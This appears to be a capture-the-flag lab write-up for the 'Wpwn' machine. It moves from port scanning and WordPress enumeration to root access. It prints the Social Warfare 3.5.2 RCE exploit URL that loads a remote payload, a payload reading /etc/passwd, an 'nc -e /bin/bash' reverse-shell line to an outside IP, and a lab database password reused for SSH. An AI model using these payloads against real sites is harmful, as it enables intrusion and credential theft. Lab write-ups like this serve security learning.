---
Alias: Wpwn
Date: 5/5/22
Platform: Linux
Difficulty: Easy
Tags: #Social-warfare3.5.2unauthenticatedRCE #wp-configFile
Status: Finished
IP: 192.168.127.123
---

# {{Wpwn}}


# Resolution summary
- Found wordpress website running on port 80
- Ran wpscan and found wordpress site is vulnerable to Social-warfare 3.5.2 unauthenticated remote code exececution exploit
- Followed the steps for exploit to read /etc/passwd file to find username and received a reverse shell as www-data
- Found mysql was listening on localhost
- Found wordpress config file with users password 
- Logged into SSH session with found username and password
- Found user can run sudo for any command 
- Typed sudo root and received a root shell

## Improved skills
- Found password credentials for SSH in wordpress config file

## Used tools
- nmap
- gobuster
- rustscan
- wpscan

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan --addresses 192.168.127.123 --ulimit 5000 -- -A -sC -Pn -sV -T 1500
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/brian/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.127.123:22
Open 192.168.127.123:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sC -Pn -sV -T 1500" on ip 192.168.127.123
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-18 22:12 PDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 22:12
Completed Parallel DNS resolution of 1 host. at 22:12, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:12
Scanning 192.168.127.123 [2 ports]
Discovered open port 22/tcp on 192.168.127.123
Discovered open port 80/tcp on 192.168.127.123
Completed Connect Scan at 22:13, 30.08s elapsed (2 total ports)
Initiating Service scan at 22:13
Scanning 2 services on 192.168.127.123
Completed Service scan at 22:13, 6.33s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.127.123.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:13
Completed NSE at 22:13, 4.41s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:13
Completed NSE at 22:13, 0.32s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:13
Completed NSE at 22:13, 0.00s elapsed
Nmap scan report for 192.168.127.123
Host is up, received user-set (0.081s latency).
Scanned at 2022-10-18 22:12:51 PDT for 26s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:b7:db:e0:ba:63:76:af:d0:20:03:11:e1:3c:0e:34 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMeW+2AyVvlr6ePuYubrIG/bVmu/K0Ids1BYbag6YJINa5mbbPE2ATbqsOnKaBhyRSDCpRr7vdn+jAUhuLhf2VogMckwyBgd5/RLDaBTLrvQwE5KidaCHrPElMcuidzcBCoAmK41o/H/w1zdBpM5Fh8ySMr7WMNCDMON00sKoPecMVxWIxzXmfZXBvSdsSk2zJAP6ds+JGduvsFFCGuoIY4A3tLGW1ZQlALkZIt143KvkQrg4rXRjgVbSvryh6a5GJskvGA3QNpUiebqMHC1zXMrjfBoi/SX944LQ0hVLfuXTriH5QkzRhLxkN+K+lvkrGN5RzAqF3IhGIfJcEp7f1
|   256 2e:20:56:75:84:ca:35:ce:e3:6a:21:32:1f:e7:f5:9a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNe7JLcAbKYhJdELk+ajEn9c68tE7GIr28etvuPibQZZIMFLwM/+Zso6zsYbUOptgjA0+y6YP1geoSoy8CQse9U=
|   256 0d:02:83:8b:1a:1c:ec:0f:ae:74:cc:7b:da:12:89:9e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKZdajYQt+tMB0kowHtm64fUkzCdJbSS1dYaS/bWQrWJ
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:13
Completed NSE at 22:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:13
Completed NSE at 22:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:13
Completed NSE at 22:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.49 seconds

```

Enumerated open TCP ports:
```bash
80
22
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 80 - HTTP (Apache)

#### -Ran Gobuster and found "/wordpress" directory and the following wordpress site webpage. Navigated the webpage and found the below login page:

![](Images/Pasted%20image%2020221018221158.png)

![](Images/Pasted%20image%2020221018221533.png)

![](Images/Pasted%20image%2020221018221609.png)


#### -Ran WPScan and found the following showing plugin "social-warfare version 3.5.2": 

![](Images/Pasted%20image%2020221018221708.png)

#### -Googled "social-warfare 3.5.2 exploit" and found the following ling and navigate to the web page and followed the steps: 
![](Images/Pasted%20image%2020221018221940.png)
![](Images/Pasted%20image%2020221018221808.png)
#Social-warfare3.5.2unauthenticatedRCE 

#### -Made a payload.txt file with the script "<pre>system('cat /etc/passwd')</pre>" inside

#### -Setup a http server to host the payload txt file with "payload.txt"

#### -Input http://WEBSITE/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt instead of listed http://WEBSITE/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt as shown in the wpscan exploit showing previously as the previous weblogin page started with "/wordpress/" directory shown below and received the following webpage finding the user "takis":  

![](Images/Pasted%20image%2020221018222059.png)

![](Images/Pasted%20image%2020221018222141.png)

---

# Exploitation
## Name of the technique
## Social-warfare 3.5.2 unathenticated remote code execution

#### -Typed vim payload.txt and changed the cat etc/passwd script with "<pre>system('nc -e /bin/bash 192.168.49.213 5002')</pre>" and ran penelope listener and received reverse shell: 

![](Images/Pasted%20image%2020221018222630.png)

![](Images/Pasted%20image%2020221018222721.png)

---

# Lateral Movement to user
## Local Enumeration

#### -Uploaded and ran linux-smart-enumeration script "lse.sh" and found services  listening on localhost. Typed "ss –nltp" to show all running services/processes running on all ports:

![](Images/Pasted%20image%2020221018223433.png)

![](Images/Pasted%20image%2020221018223516.png)


## Lateral Movement vector
## Found users password for SSH login in wordpress config file

#### -Typed "ls -ls /var/www/html/wordpress | grep .conf" to list all config files for site and cat'd the configuration file and found the following credentials: 

/** The name of the database for WordPress */ 

define( 'DB_NAME', 'wordpress_db' ); 

 

/** MySQL database username */ 

define( 'DB_USER', 'wp_user' ); 

  

/** MySQL database password */ 

define( 'DB_PASSWORD', 'R3&]vzhHmMn9,:-5' ); 

  

/** MySQL hostname */ 

define( 'DB_HOST', 'localhost' ); 

![](Images/Pasted%20image%2020221018224046.png)
#wp-configFile

#### -Typed "ssh takis@localhost" then input the password "R3&]vzhHmMn9,:-5" found earlier in the config file and received a ssh session for user "takis" below: 

![](Images/Pasted%20image%2020221018224246.png)
---


# Privilege Escalation
## Local Enumeration

#### -Typed "sudo-l" and found user can run sudo for any command. 


## Privilege Escalation vector
## User is able to run any command using sudo

#### Typed "sudo su root" and received a root shell and found root flag in "proof.txt" file: 

![](Images/Pasted%20image%2020221018224509.png)

---

